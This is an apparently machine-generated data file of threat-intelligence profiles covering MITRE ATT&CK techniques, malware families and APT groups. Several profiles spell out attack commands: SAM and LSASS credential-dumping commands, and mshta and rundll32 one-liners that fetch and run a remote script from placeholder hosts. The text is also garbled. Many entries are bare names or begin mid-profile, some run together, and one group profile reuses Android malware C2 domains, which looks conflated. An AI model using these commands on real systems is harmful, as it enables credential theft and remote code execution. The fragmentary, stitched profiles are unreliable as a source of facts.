15599.profile_without_enhance_5: [profile]T1197, known as BITS Jobs, is a Defense Evasion and Persistence technique for Windows. It abuses the Background Intelligent Transfer Service (BITS), a legitimate asynchronous file transfer mechanism, to download, execute, and clean up malicious code. Adversaries create and manage these jobs using tools like PowerShell and BITSAdmin, enabling long-term, firewall-permitted execution and persistence through job triggers that survive reboots.

15600.name: T1546.008
15600.profile_without_enhance_5: [profile]The technique T1546.008, known as Accessibility Features, falls under the Persistence and Privilege Escalation tactics for Windows. It works by adversaries modifying or replacing accessibility binaries like sethc.exe (Sticky Keys) or utilman.exe, or their registry references, to execute malicious commands. This is often triggered at the login screen via key combinations (e.g., pressing Shift five times or Windows+U) to gain unauthenticated, SYSTEM-level access, particularly through remote desktop sessions. For newer Windows systems, bypasses like Image File Execution Options Injection may be used to avoid binary replacement restrictions.

15601.name: T1003.002
15601.profile_without_enhance_5: [profile]T1003.002, known as Security Account Manager (SAM), is a Credential Access technique targeting Windows platforms. It involves extracting credential material from the SAM database, which stores local account hashes, by either using in-memory tools like Mimikatz and secretsdump.py or dumping the database from the Registry with commands such as `reg save HKLM\sam sam`. This activity requires SYSTEM level access and is associated with threat groups including APT29 and Wizard Spider.

15602.name: Accessibility Features
15602.profile_without_enhance_5: [profile]Accessibility Features is a Windows-specific technique (T1015) used for Persistence and Privilege Escalation. It involves modifying accessibility programs like sethc.exe (sticky keys) or utilman.exe, which launch before login via key combinations (e.g., Shift five times, Windows+U). Adversaries achieve execution with SYSTEM privileges by either directly replacing the binary with a malicious file like cmd.exe or, on newer systems, using the debugger method via Image File Execution Options Injection to modify Registry keys and set a debugger for the target program. This provides unauthenticated backdoor access, especially through the Remote Desktop login screen.

15603.name: SQL Stored Procedures
15603.profile_without_enhance_5: [profile]SQL Stored Procedures is identified as MITRE ATT&CK technique T1505.001, operating under the Persistence tactic on Windows and Linux platforms. Adversaries abuse this mechanism by crafting malicious stored procedures within SQL database servers to maintain persistent access. This can involve enabling and using features like `xp_cmdshell` to execute operating system commands via SQL syntax or leveraging CLR integration to link stored procedures to .NET assemblies that run arbitrary commands, often triggered automatically during database or server startup events.

15604.name: BITS Jobs
15604.profile_without_enhance_5: [profile]BITS Jobs is a MITRE ATT&CK technique with ID T1197, used for Defense Evasion and Persistence on Windows platforms. It abuses the Windows Background Intelligent Transfer Service (BITS), a legitimate low-bandwidth file transfer mechanism, to download, execute, and clean up malicious code. Adversaries create and manage these BITS jobs using PowerShell or the BITSAdmin tool. The jobs are self-contained in a system database, often bypassing host firewalls, and can be configured for long-term persistence with a default lifetime of up to 90 days, including execution upon job completion or after system reboots.

15605.name: Image File Execution Options Injection
15605.profile_without_enhance_5: [profile]Image File Execution Options Injection, also known as T1183, is a persistence and privilege-escalation technique for Windows platforms. It abuses the Image File Execution Options (IFEO) registry debugger or silent process exit monitor to redirect and execute a malicious payload. This is achieved by setting a `Debugger` value under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` or configuring a `MonitorProcess` under the `SilentProcessExit` key, causing a specified malicious executable to launch instead of or alongside the legitimate target process.

15606.name: Security Account Manager
15606.profile_without_enhance_5: [profile]Security Account Manager, identified as MITRE ATT&CK technique T1003.002 under the Credential Access tactic for Windows platforms, involves extracting credential material from the SAM database. This requires SYSTEM-level access and can be achieved through in-memory tools like Mimikatz, gsecdump, pwdumpx.exe, or secretsdump.py, or by extracting the database from the Registry using commands such as `reg save HKLM\sam sam` and `reg save HKLM\system system`. The extracted file can then be processed locally with tools like Creddump7 to retrieve account hashes, with the local built-in administrator account identified by RID 500.

15607.name: LAMEHUG
15607.profile_without_enhance_5: [profile]LAMEHUG, also known as lamehug, is a malware linked to APT28 (Fancy Bear). It is delivered via phishing and is packaged as a Python executable converted with PyInstaller, with variants including files like Додаток.pif, save_document.py, AI_generator_uncensored_Canvas_PRO_v0.9.exe, AI_image_generator_v0.95.exe, and image.py. Its behaviors include Account Discovery (T1087) and Permission Groups Discovery (T1069) for reconnaissance, and it performs Automated Exfiltration (T1020), specifically Exfiltration Over C2 Channel (T1041), to steal data. It has been used in attacks targeting Ukraine.[/profile]

15608.name: T1137.001
15608.profile_without_enhance_5: [profile]T1137.001, known as Office Template Macros, is a persistence technique within the MITRE ATT&CK framework targeting Windows and Office Suite platforms. It works by adversaries inserting malicious Visual Basic for Applications (VBA) macros into base Microsoft Office templates, such as Word's Normal.dotm or Excel's PERSONAL.XLSB, which execute code when the respective application starts. Persistence can also be achieved by modifying the GlobalDotName registry key to point to a malicious template in a custom location, potentially requiring the macro to be placed in a trusted location or registered as a trusted document to bypass security policies that restrict macro execution.

15611.name: HTA Trojan
15611.profile_without_enhance_5: [profile]HTA Trojan is a malware entity. It is associated with the APT34 threat group. Its key TTPs involve execution via malicious .hta files, which trigger scripts (like 0011.ps1) to generate and deploy secondary payloads such as the Helminth Trojan, and it employs process termination to evade detection. The malware targets Windows platforms, with known infrastructure or activity linked to Kazakhstan.[/profile]

15749.name: T1482
15749.profile_without_enhance_5: [profile]The entity is the MITRE ATT&CK technique Domain Trust Discovery, identified as T1482 under the Discovery tactic for Windows platforms. This technique involves adversaries gathering information on domain trust relationships to identify lateral movement opportunities in multi-domain or forest environments. Technical mechanics include enumerating trusts using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, LDAP, or the Nltest utility. The discovered trust information can facilitate follow-on techniques like SID-History Injection, Pass the Ticket, and Kerberoasting.

15751.name: HeadLace
15751.profile_without_enhance_5: [profile]HeadLace, also known as headlace, is a malware that employs Masquerading by disguising itself as a Windows update, displaying fake status messages to mimic a legitimate process. It utilizes User Execution, often initiated via Phishing with HTML attachments containing fake login windows in iframes to steal credentials. The malware leverages Command and Scripting Interpreter for execution and is associated with APT28, which uses public HTTP debugging/webhook services to exfiltrate stolen data. It primarily targets Windows platforms.[/profile]

15765.name: SilentGh0st

Its key technical behaviors include extensive functionality through a rich set of commands and modules, and it has evolved into newer variants like InsidiousGh0st, TranslucentGh0st, EtherealGh0st, and FluffyGh0st. It operates on Windows platforms and uses domains like bit.kozow.com, word.emldn.com, airst.giize.com, spcg.lunaticfridge.com, and upupdate.ooguy.com for command and control.[/profile]

15766.name: SharpJSHandler

Its technical behaviors involve using JavaScript to download and execute further payloads, such as PowerShell scripts, which in turn load .NET injectors into memory to deploy subsequent malware stages like ransomware loaders. It operates on Windows platforms and communicates with command and control infrastructure via domains such as dns-log.d-n-s.org.uk, link.theworkguyoo.com, payroll.mywire.org, dns.g8z.net, and api.simpletra.com.[/profile]

15768.name: TranslucentGh0st
15768.profile_without_enhance_5: [profile]TranslucentGh0st, also known as a variant of SilentGh0st, is a newer malware variant featuring dynamic plugin loading and a lighter footprint for evasive operation. It is associated with the threat group SparklingGoblin. Its key technical behaviors include abusing the Windows Background Intelligent Transfer Service (BITS) for defense evasion and persistence, using execution guardrails for environmental keying to constrain payload execution, and potentially leveraging Office Application Startup for persistence. Its target platform is Windows, and its associated infrastructure includes domains such as upupdate.ooguy.com, bit.kozow.com, dns.g8z.net, word.emldn.com, and auth.bitdefenderupdate.com.[/profile]

15769.name: unkown_apt_group
15769.profile_without_enhance_5: [profile]The intrusion set is most likely the Chinese-aligned threat actor known as Unfading Sea Haze, also associated with the SparklingGoblin cluster. It is also known by aliases such as silentgh0st group. Its key malware includes SilentGh0st and its newer variants like TranslucentGh0st, which is characterized by dynamic plugin loading and a lighter footprint. Key TTPs involve abusing the Windows Background Intelligent Transfer Service (BITS) for persistence and defense evasion, using execution guardrails for environmental keying, and leveraging Office Application Startup mechanisms. The group is attributed to China and primarily targets military and government entities in the South China Sea region for intelligence collection and espionage. Its motivation is strategic intelligence gathering.[/profile]

15776.name: T1136
15776.profile_without_enhance_5: [profile]T1136, Create Account, is a persistence technique within the MITRE ATTACK framework applicable across Windows, Linux, macOS, and cloud platforms. Adversaries create local, domain, or cloud service accounts to establish secondary, credentialed access for maintaining persistence without deploying remote tools. This activity often precedes or enables subsequent actions like adding elevated cloud roles to the newly created or compromised accounts. Groups such as Scattered Spider and Indrik Spider have been observed using this technique.[/profile]

15777.name: T1486
15777.profile_without_enhance_5: [profile]T1486, Data Encrypted for Impact, is an Impact tactic technique affecting Windows, Linux, macOS, IaaS, and ESXi platforms. It involves encrypting files on local/remote drives or cloud storage objects to render data inaccessible, often for ransomware. Specific mechanics include encrypting common user files, critical system files like the MBR, disk partitions, and virtual machines on ESXi hypervisors. Attackers may use tools like `esxcli` to manage hypervisors for this purpose, and the technique can propagate via worm-like features using Valid Accounts or SMB shares. Associated vulnerabilities include CVE-2025-49706 and CVE-2024-21412.

15778.name: T1498
15778.profile_without_enhance_5: [profile]T1498, Network Denial of Service, is an Impact tactic technique targeting Windows, Linux, macOS, Containers, and IaaS platforms. It works by exhausting a target's network bandwidth to degrade or block resource availability, such as websites or DNS services, often using distributed systems (DDoS). Attackers may spoof source IP addresses to obscure the attack's origin. A specific sub-technique, Direct Network Flood (T1498.001), involves sending high-volume traffic via protocols like UDP or ICMP, frequently employing botnets. The technique can be facilitated by malware that hijacks victim bandwidth (T1496.002) and has been associated with groups like APT28.[/profile]

15779.name: Phishing for Information
15779.profile_without_enhance_5: [profile]Phishing for Information is a reconnaissance technique (T1598) within the MITRE ATT&CK framework, operating on the PRE platform. It involves adversaries sending electronic messages, such as emails or instant messages, to trick targets into divulging sensitive data like credentials. This is distinct from code-execution phishing; its primary goal is information gathering. Techniques include spearphishing specific individuals, spoofing sender identities via Email Spoofing (T1672), using urgent social engineering pretexts, and employing evasive tactics like manipulating email headers or metadata from compromised accounts.

15780.name: Abuse Elevation Control Mechanism
15780.profile_without_enhance_5: [profile]Abuse Elevation Control Mechanism, identified as T1548, is a defense evasion and privilege escalation technique applicable to Windows, Linux, macOS, IaaS, Office Suite, and Identity Provider platforms. It involves circumventing native system controls like Windows User Account Control (UAC) or Linux sudo to gain higher-level permissions without proper authorization. Specific technical methods include exploiting auto-elevation in programs like `eventvwr.exe`, using tools like UACMe, injecting into trusted processes, or leveraging lateral movement with compromised admin credentials. It is associated with threat groups including APT37, MuddyWater, and UNC3886.

15781.name: T1155
15781.profile_without_enhance_5: [profile]T1155, also known as AppleScript, is a technique within the Execution tactic for the macOS platform. It involves using AppleScript for interprocess communication (IPC) to interact with open applications, both locally and remotely, by sending AppleEvent messages. This can include locating windows, sending keystrokes, and presenting fake dialog boxes to users. Scripts are executed via the command-line with `osascript`. The technique is also referenced in relation to credential phishing via fake prompts and for persistence by setting login items through the `SMLoginItemSetEnabled` API.

15782.name: Create Account
15782.profile_without_enhance_5: [profile]Create Account is MITRE ATT&CK technique T1136 under the Persistence tactic, applicable across Windows, Linux, macOS, and network/cloud platforms. Adversaries create local, domain, or cloud accounts to establish secondary credentialed access, using commands like `net user /add` on Windows, `useradd` on Linux, `dscl -create` on macOS, or `username` on network devices. This allows persistent access without deploying remote tools, and in cloud environments, accounts with limited service permissions can evade detection.

15783.name: Network Denial of Service
15783.profile_without_enhance_5: [profile]Network Denial of Service, or T1498, is an Impact tactic targeting Windows, Linux, macOS, IaaS, and Containers. It works by exhausting the bandwidth capacity of a target's network connection, such as by directing a high volume of malicious traffic (e.g., 10Gbps to a 1Gbps link) to saturate it, which can be executed as a Distributed Denial of Service (DDoS) using botnets. Attackers often employ IP address spoofing to obscure the traffic source and complicate mitigation. This technique is distinct from Endpoint Denial of Service (T1499) and has been associated with groups like APT28.[/profile]

15784.name: Data Encrypted for Impact
15784.profile_without_enhance_5: [profile]Data Encrypted for Impact (T1486) is an Impact tactic technique targeting Windows, Linux, macOS, IaaS, and ESXi platforms. It involves adversaries encrypting data on systems or across networks to disrupt availability, often for ransomware or destructive purposes. Technical mechanics include encrypting common user files, critical system files, disk partitions, MBR, and virtual machines on hypervisors like ESXi, using worm-like propagation via techniques like Valid Accounts and SMB shares, and employing cloud services like AWS SSE-C for encryption. Adversaries may first perform actions like File Permissions Modification or System Shutdown to access files and may use internal defacement or "print bombing" to intimidate victims.

15785.name: T1598
15785.profile_without_enhance_5: [profile]T1598, Phishing for Information, is a reconnaissance technique within the MITRE ATT&CK framework, operating on the PRE platform. It involves adversaries sending phishing messages to trick targets into divulging sensitive information like credentials, differing from code-execution phishing. This is often conducted via spearphishing, email spoofing, or directing victims to call fraudulent numbers, and may employ evasive tactics such as manipulating email headers from compromised accounts. Groups like APT28 and Kimsuky have been associated with this technique.

15786.name: T1548
15786.profile_without_enhance_5: [profile]T1548, known as Abuse Elevation Control Mechanism, is a defense evasion and privilege escalation technique applicable to Windows, Linux, macOS, IaaS, Office Suite, and Identity Provider platforms. It involves circumventing native system controls like User Account Control (UAC) or sudo mechanisms to gain higher-level permissions. Specific methods include abusing tools such as CMSTP.exe with malicious INF files to bypass UAC, as referenced in the related CMSTP technique, and adding user accounts to privileged groups like sudoers or local administrators to enable persistent elevated access.

15848.name: Triada
15848.profile_without_enhance_5: [profile]Triada is a malware family targeting Android devices, known for its backdoor capabilities and communication with command-and-control servers such as https://wa.zcnewy.com and http://av2wg.rt14v.com. It employs reverse engineering countermeasures, including encrypting strings in the Android framework library to hinder analysis. Google Play Protect actively tracks and removes Triada and related apps from user devices.

15850.name: unkown_apt_group
15850.profile_without_enhance_5: [profile]This intrusion set, likely the APT group known as "Lotus Panda" (also aliased as Lotus Blossom, Red Salamander, ST Group, ATK1, Dragonfish, G0030, Spring Dragon, Billbug, and Bronze Elgin), has shown unexpected overlaps with other APTs. Its operational infrastructure has utilized domains such as https://wa.zcnewy.com and http://av2wg.rt14v.com. The group is believed to be of Chinese origin, primarily targeting diplomatic and governmental sectors in Southeast Asia, with motivations centered on espionage and information theft.

15873.name: unkown_apt_group
15873.profile_without_enhance_5: [profile]The intrusion set is most likely the Mustang Panda APT group, also known as Bronze President, RedDelta, and TEMP.Hex. Its key malware includes the custom loaders PUBLOAD and TONESHELL, and it has been observed using shared tools like PlugX and ShadowPad. Its tactics involve credential access via the Security Account Manager (SAM) and data collection from removable media. The group is attributed to China and primarily targets Southeast Asia and the Pacific, including Laos, Cambodia, Myanmar, Malaysia, the Philippines, and Singapore, with a focus on government and diplomatic sectors, indicating espionage motivations. It shows overlaps with clusters like Lotus Panda and BackdoorDiplomacy.[/profile]

15874.name: T1094
15874.profile_without_enhance_5: [profile]The entity is identified as MITRE ATT&CK technique T1094, named "Custom Command and Control Protocol", which falls under the Command and Control tactic. It operates across multiple platforms. This technique involves adversaries communicating using a custom protocol instead of using a standard application layer protocol. Implementations can include mimicking legitimate protocols or developing entirely new protocols, potentially using raw sockets, built on top of standard network stacks like TCP/IP to evade detection by blending in or avoiding known signatures.

15875.name: PlugX

15876.name: TA0028

15894.name: ShadowPad - S0596

15924.name: T1003.001

Attackers use tools like Mimikatz with commands such as `sekurlsa::logonPasswords`, Procdump (`procdump -ma lsass.exe`), or built-in Windows utilities like `comsvcs.dll` via `rundll32` to create a memory dump for offline analysis. This enables lateral movement using stolen credentials and is widely used by threat groups including APT28, APT29, and FIN6.

15925.name: T1021.002
15925.profile_without_enhance_5: [profile]T1021.002, known as SMB/Windows Admin Shares, is a Lateral Movement technique for Windows. It involves adversaries using valid accounts to remotely access hidden administrative network shares like C$, ADMIN$, and IPC$ via the Server Message Block (SMB) protocol. This access enables file transfers, remote execution via techniques like Scheduled Tasks or WMI, and lateral movement across the network, often leveraging Pass the Hash for authentication. It is associated with groups like APT28 and Lazarus.

15926.name: T1021.004
15926.profile_without_enhance_5: [profile]T1021.004, named SSH and part of the Lateral Movement tactic, targets macOS, Linux, and ESXi platforms. This technique involves using valid accounts to log into remote machines via the Secure Shell (SSH) protocol to open remote shells and perform actions. SSH can be enabled on ESXi hosts via commands like `vim-cmd hostsvc/enable_ssh` and supports password or public-key authentication using SSH Authorized Keys. Associated threat groups include FIN13, Scattered Spider, and Lazarus Group, and it has been linked to vulnerabilities like CVE-2023-46604.[profile]

15927.name: T1218.011
15927.profile_without_enhance_5: [profile]T1218.011, also known as Rundll32, is a defense evasion technique for Windows. It involves abusing the legitimate rundll32.exe binary to proxy the execution of malicious code, often to bypass security monitoring. Technical mechanics include executing DLL payloads via commands like `rundll32.exe {DLLname, DLLfunction}`, running Control Panel Item files (.cpl), or executing scripts such as JavaScript. Adversaries may also abuse signed system DLLs (e.g., zipfldr.dll) with rundll32, obscure function loading by exploiting Unicode/ANSI resolution order (e.g., targeting ExampleFunctionW before ExampleFunction), or execute functions by ordinal number (e.g., `rundll32.exe file.dll,#1`). It is associated with groups like APT28 and Lazarus Group.

15928.name: SSH
15928.profile_without_enhance_5: [profile]SSH is a remote service technique, identified as T1021.004 in the MITRE ATT&CK framework, used for Lateral Movement on macOS, Linux, and ESXi platforms. Adversaries use valid accounts to log into remote machines via the SSH protocol, which provides an encrypted remote shell. The service can be enabled on ESXi hosts using commands like `vim-cmd hostsvc/enable_ssh` and authenticates via passwords or public-private key pairs, where authorized public keys are stored in user-specific files. This method is distinct from SSH Hijacking, which involves taking over an existing session.[/profile]

15929.name: LSASS Memory
15929.profile_without_enhance_5: [profile]LSASS Memory is a Credential Access technique, formally known as MITRE ATT&CK T1003.001 (OS Credential Dumping), targeting the Windows platform. It involves harvesting credential material from the memory of the Local Security Authority Subsystem Service (lsass.exe) process after user logon. Specific technical mechanics include dumping process memory using tools like procdump (`procdump -ma lsass.exe`), the built-in `comsvcs.dll` via `rundll32`, or abusing the silent process exit mechanism. Credentials can also be accessed by loading malicious Security Support Provider (SSP) DLLs into LSASS, which are configured via Registry keys `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` and `...\OSConfig\Security Packages`. The dumped memory can be analyzed offline with tools like Mimikatz (`sekurlsa::Minidump`, `sekurlsa::logonPasswords`) to extract plaintext passwords and hashes for lateral movement.

15930.name: SMB/Windows Admin Shares

This access enables file transfers, remote procedure calls (RPCs), and remote execution of payloads through follow-on techniques like Scheduled Task or Windows Management Instrumentation, facilitating lateral movement across a network. The Net utility (e.g., `net use`) is commonly used to establish these connections.[profile]

15931.name: Rundll32
15931.profile_without_enhance_5: [profile]Rundll32 is a Defense Evasion technique under MITRE ATT&CK ID T1218.011, targeting the Windows platform. Specific technical mechanics include executing DLL payloads via commands like `rundll32.exe {DLLname, DLLfunction}`, running Control Panel Item files (.cpl) using functions such as `Control_RunDLL`, and executing scripts like JavaScript with syntax such as `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//example.com/malicious.sct")`. Adversaries further obscure execution by leveraging legitimate signed system DLLs (e.g., zipfldr.dll), exploiting character set compatibility to load functions with appended 'W' or 'A', using ordinal numbers (e.g., `rundll32.exe file.dll,#1`), and employing masquerading techniques.

15951.name: PUBLOAD

16073.name: Email Accounts

16074.name: Link Target

Adversaries often use deceptive domains acquired via typosquatting, leverage link-shortening services and trusted Platform-as-a-Service providers to host targets, and employ uniquely generated or single-use URLs to evade detection and blocking.

16075.name: T1564.001

Adversaries may also abuse the macOS UF_HIDDEN flag or name files with only a space character. 16076.name: T1585.002

16077.name: T1091

This method can also leverage mobile devices connected via USB to infect PCs. 16080.name: Replication Through Removable Media

Attackers may also modify legitimate files on the media or rename malware to appear as a legitimate file to trick users into manual execution. This method can be used to bridge air-gapped networks and has been associated with groups like APT28 and Gamaredon Group.

16081.name: Data from Removable Media

16238.name: T1086

PowerShell can be invoked directly via powershell.exe or indirectly through .NET interfaces, and it is commonly used to run commands with hidden windows (e.g., `-WindowStyle Hidden`) or to create fake credential prompts for phishing.

16239.name: T1587

16243.name: Develop Capabilities

16244.name: T1591

16247.name: T1123

16462.name: T1027.003
16462.profile_without_enhance_5: [profile]T1027.003, Obfuscated Files or Information: Steganography, is a defense evasion technique applicable to Windows, Linux, and macOS. It works by hiding data within digital media like images, audio, or video files to prevent detection. For example, malware like Duqu has encrypted stolen data and concealed it inside an image for exfiltration, and threat actors have used tools like Invoke-PSImage to embed and execute PowerShell commands from within a PNG file.

16464.name: T1056.002
16464.profile_without_enhance_5: [profile]T1056.002, known as GUI Input Capture, is a technique within the Credential Access and Collection tactics. It operates on Windows, Linux, and macOS platforms. Adversaries mimic legitimate operating system or application authentication prompts to deceive users into entering credentials. This is commonly implemented using scripting languages like AppleScript, PowerShell, or Unix shell scripts to launch dialog boxes that spoof standard software or privilege elevation requests, thereby harvesting sensitive authentication data.

16465.name: Steganography
16465.profile_without_enhance_5: [profile]Steganography is a Command and Control technique (ID: T1001.002) used on Windows, Linux, macOS, and ESXi platforms. It involves hiding data or C2 traffic within digital media like images, audio, video, or text files to evade detection. Specific implementations include malware like Duqu hiding exfiltrated data in images and threat groups using tools like Invoke-PSImage to embed and execute PowerShell commands from PNG files.

16466.name: GUI Input Capture
16466.profile_without_enhance_5: [profile]GUI Input Capture, identified as T1056.002, is a credential access technique within the MITRE ATT&CK framework that operates on Windows, Linux, and macOS. It involves adversaries creating deceptive graphical user interface (GUI) components, such as fake authentication prompts or software installers, to trick users into entering their credentials. This is commonly executed using scripting languages like AppleScript on macOS or PowerShell on Windows to generate the fraudulent dialog boxes. The technique is associated with threat groups like RedCurl and FIN4.

16467.name: T1586.002
16467.profile_without_enhance_5: [profile]T1586.002, "Compromise Email Accounts," is a Resource Development technique within the MITRE ATT&CK framework for the PRE platform. Adversaries compromise accounts through methods like credential phishing, purchasing, or brute-forcing, often informed by prior reconnaissance. These accounts are then used to conduct subsequent operations, including launching phishing campaigns, sending malicious spam to evade filters, hijacking existing email threads, and acquiring other infrastructure like domains.

16468.name: T1553.005
16468.profile_without_enhance_5: [profile]T1553.005, known as Mark-of-the-Web Bypass, is a Defense Evasion technique for Windows. It involves abusing container file formats like .iso or .vhd to subvert security controls. When these containers are downloaded from the internet, they are tagged with the Mark-of-the-Web (MOTW) via an NTFS Alternate Data Stream, but files extracted or mounted from within the container may not inherit this MOTW tag. Consequently, malicious payloads inside are treated as local files and can execute without triggering protections like Protected View in Microsoft Office or Windows Defender SmartScreen checks.

16469.name: Mark-of-the-Web Bypass
16469.profile_without_enhance_5: [profile]Mark-of-the-Web Bypass, identified as T1553.005, is a Defense Evasion technique for Windows. It subverts security by exploiting container file formats like .iso or .vhd. When these containers are downloaded from the internet, they receive the MOTW tag, but the malicious files inside do not inherit this tag upon extraction or mounting. Consequently, these internal payloads are treated as local files and can execute without triggering Windows Defender SmartScreen warnings or Microsoft Office Protected View, effectively bypassing the security controls.

16471.name: HijackLoader
16471.profile_without_enhance_5: [profile]HijackLoader is a sophisticated loader malware first observed in July 2023. It employs defense evasion techniques including abusing msiexec (T1218.007), mshta, and rundll32 (T1218.011) to proxy execution, and uses Registry Run Keys for persistence. It has been used to deliver payloads like the SecTop RAT and infostealers including Stealc, Lumma, and Amadey. The malware uses encrypted modules and has been associated with activity targeting Colombia.[/profile]

16476.name: T1053.007
16476.profile_without_enhance_5: [profile]T1053.007 - Container Orchestration Job is a MITRE ATT&CK technique within the Execution, Persistence, and Privilege Escalation tactics, targeting Container platforms. It involves abusing task scheduling in orchestration tools like Kubernetes, where adversaries use CronJobs to schedule the deployment of Jobs that run malicious containers at specific times. This method automates execution and can maintain persistence by configuring deployments to sustain a quantity of containers over time within a cluster.

16478.name: T1548.003
16478.profile_without_enhance_5: [profile]T1548.003, named Sudo and Sudo Caching, is a technique used for Privilege Escalation and Defense Evasion on Linux and macOS platforms. It involves abusing the `sudo` command's credential caching mechanism and the `/etc/sudoers` file configuration to execute commands with elevated privileges without requiring a password. Adversaries monitor or manipulate the timestamp file at `/var/db/sudo` to operate within the `timestamp_timeout` window or disable the `tty_tickets` isolation feature, as seen in malware that adds `Defaults !tty_tickets` to the sudoers file and issues `killall Terminal` to apply the change.

16479.name: Mshta
16479.profile_without_enhance_5: [profile]Mshta, also known as T1218.005, is a Defense Evasion technique for the Windows platform. It involves abusing the trusted mshta.exe utility to proxy execution of malicious scripts or HTML Application (HTA) files. Execution can occur via inline scripts, such as `mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`, or directly from URLs like `mshta http[:]//webserver/payload[.]hta`. This method is used to bypass application whitelisting and browser security settings, as mshta.exe operates outside Internet Explorer's security context.

16480.name: T1547.003
16480.profile_without_enhance_5: [profile]T1547.003, known as Time Providers, is a persistence and privilege-escalation technique for Windows. It involves adversaries creating a malicious DLL and registering it as a time provider by adding a new subkey with the `DllName` value pointing to that DLL under the registry key `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`. The Windows Time service manager then loads and executes this DLL at system startup. Administrator privileges are required for registration, but execution runs in the context of the Local Service account.

16481.name: Container Orchestration Job
16481.profile_without_enhance_5: [profile]The entity is the MITRE ATT&CK technique "Container Orchestration Job" (ID: T1053.007) under the Execution, Persistence, and Privilege Escalation tactics for Container platforms. It involves abusing task scheduling in orchestration tools like Kubernetes, where an adversary can use a CronJob to schedule a Job that deploys containers executing malicious code at specific times. This method automates execution and can maintain a persistent presence by configuring deployments to sustain a quantity of containers over time within a cluster.

16482.name: Time Providers
16482.profile_without_enhance_5: [profile]Time Providers is a Windows-specific technique for persistence and privilege escalation, identified as MITRE ATT&CK T1547.003 (Boot or Logon Autostart Execution). It abuses the Windows Time service (W32Time) architecture by registering a malicious DLL as a time provider in the registry key `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`. This malicious provider is then loaded and executed at system startup by the service control manager, running in the context of the Local Service account, though administrator privileges are required for the initial registration.

16483.name: Sudo and Sudo Caching
16483.profile_without_enhance_5: [profile]Sudo and Sudo Caching is identified as MITRE ATT&CK technique T1548.003 under the Defense Evasion and Privilege Escalation tactics for Linux and macOS platforms. It involves abusing the sudo credential caching mechanism by monitoring the timestamp file at `/var/db/sudo` to execute commands without a password if within the `timestamp_timeout` window, especially when the `tty_tickets` feature is disabled. Adversaries may modify the `/etc/sudoers` file, for instance by adding `Defaults !tty_tickets`, and then issue `killall Terminal` to apply changes, as observed in malware like OSX Proton.

16523.name: T1205
16523.profile_without_enhance_5: [profile]Traffic Signaling, identified as T1205, is a technique used for Command and Control, Defense Evasion, and Persistence across Windows, Linux, macOS, and Network Devices. It involves sending a specific sequence or "magic" packet to trigger a hidden response, such as opening a closed port (e.g., via Port Knocking) or activating malicious functionality on an already open port. This signaling can use unique packet characteristics, attempted connections to a sequence of ports, or raw sockets to evade detection. On network devices, it may require prior patching of the system image to implement and can be used to enable unauthorized access or modify device implants.[/profile]

16524.name: Traffic Signaling
16524.profile_without_enhance_5: [profile]Traffic Signaling (T1205) is a command and control, defense evasion, and persistence technique used on Windows, Linux, macOS, and Network Devices. It involves sending a specific "magic" value or packet sequence to a system to trigger a hidden response, such as opening a closed port or executing a malicious task. Common implementations include port knocking, using unusual packet flags or strings, or leveraging features like Wake-on-LAN. On network devices, this often requires prior system image patching to enable crafted packet authentication or service activation.

16526.name: unkown_apt_group
